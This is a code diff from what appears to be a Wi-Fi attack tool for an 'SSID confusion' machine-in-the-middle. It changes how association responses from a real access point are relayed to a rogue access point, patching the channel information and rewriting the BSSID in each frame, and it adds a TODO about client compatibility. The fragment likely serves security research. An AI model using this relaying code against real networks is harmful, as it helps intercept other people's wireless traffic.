@@ -85,16 +85,10 @@ FrameProcess SsidConfusion::handle_assoc_real(
 		if(addr1 == rogue_sta.get(SK::mac) && client_state.get_state() >= ClientState::Associated) {
 			log(LogLevel::DEBUG, "AssocResp: addr1={} rogue_sta={} state={}", addr1, rogue_sta.get(SK::mac), ClientState::state2str(client_state.get_state()));
 			display_traffic(*dot11, "Real channel", " assoc resp -- relay to rogue");
-			if(const auto *ar = dot11->find_pdu<Dot11AssocResponse>()) {
-				const unique_ptr<Dot11AssocResponse> patched(assoc_resp_channel_patch(*ar, netconfig.rogue_channel));
-				auto relayed = ensure_radiotap(patched->serialize());
-				rewrite_bssid_in_frame(relayed, rogue_ap.get(SK::mac));
-				send_to_rogue(relayed);
-			} else {
-				auto relayed = ensure_radiotap(raw);
-				rewrite_bssid_in_frame(relayed, rogue_ap.get(SK::mac));
-				send_to_rogue(relayed);
-			}
+			auto relayed = ensure_radiotap(raw);
+			patch_ht_operation_in_frame(relayed, netconfig.rogue_channel.ch_num);
+			rewrite_bssid_in_frame(relayed, rogue_ap.get(SK::mac));
+			send_to_rogue(relayed);
 		}
 		return STOP;
 	}
@@ -144,6 +138,7 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const f
 
 	SOLVE_OR_CONTINUE(handle_probe_real(addr2, *dot11))
 	SOLVE_OR_CONTINUE(handle_eapol_real(addr2, *pdu, raw))
+	//TODO assoc ok for relaying? - test this is not issue for some clients
 	SOLVE_OR_CONTINUE(handle_assoc_real(addr1, *pdu, raw))
 	SOLVE_OR_CONTINUE(handle_mgmt_action_real(addr1, *dot11, raw))
 	#undef SOLVE_OR_CONTINUE
